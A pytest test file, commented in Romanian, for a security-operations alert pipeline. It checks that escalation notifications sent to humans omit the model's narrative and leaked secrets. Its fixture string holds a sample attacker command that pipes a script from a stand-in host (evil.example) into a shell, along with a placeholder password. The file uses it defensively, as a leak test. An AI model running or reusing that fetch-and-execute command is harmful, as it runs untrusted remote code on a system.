"""E: naratiunea modelului nu pleaca pe Discord (pointer, nu telemetrie). Fara retea."""
from __future__ import annotations

import notify
from escalation import EscalationDecision
from schemas import ActionType, Classification, EscalationReason, Verdict

SECRET = "www-data a rulat: bash -c 'curl http://evil.example/x.sh | sh' PAROLA=hunter2"


def _verdict() -> Verdict:
    return Verdict(investigation_id="i", source_path="fast", entity_type="host", entity_id="web-prod",
                   classification=Classification.MALICIOUS, confidence=97, rarity_score=1.0,
                   proposed_action=ActionType.ESCALATE_HUMAN, model_id="m",
                   chain_id="01234567-89ab-cdef-0123-456789abcdef")


def _capture(monkeypatch):
    sent = {}

    def fake(title, detail="", **kw):
        sent.update(title=title, detail=detail, **kw)
        return True
    monkeypatch.setattr(notify, "notify_human", fake)
    return sent


def test_naratiunea_nu_apare_in_payload(monkeypatch):
    sent = _capture(monkeypatch)
    esc = EscalationDecision(escalate=True, reasons=[EscalationReason.HONEYTOKEN])
    assert notify.maybe_notify_escalation(_verdict(), SECRET, esc, None, rule_name="soc-honeytoken-read",
                                          shadow=True) is True
    blob = sent["title"] + sent["detail"] + str(sent.get("host"))
    for piece in ("curl", "evil.example", "hunter2", "bash -c", "www-data a rulat"):
        assert piece not in blob
    # ce TREBUIE sa contina: severitate, motiv, regula, host, clasificare/incredere, chain scurt, Kibana
    assert sent["severity"] == "critical" and "honeytoken" in sent["title"]
    assert "soc-honeytoken-read" in sent["title"] and "[SHADOW]" in sent["title"]
    assert sent["host"] == "web-prod" and "malicious/97" in sent["detail"]
    assert "chain=01234567-89a" in sent["detail"] and "Kibana" in sent["detail"]
    assert sent["dedup_key"] == "esc:01234567-89ab-cdef-0123-456789abcdef"


def test_escaladare_necritica_nu_notifica(monkeypatch):
    sent = _capture(monkeypatch)
    esc = EscalationDecision(escalate=True, reasons=[EscalationReason.LOW_CONFIDENCE])
    assert notify.maybe_notify_escalation(_verdict(), SECRET, esc, None) is False
    assert not sent
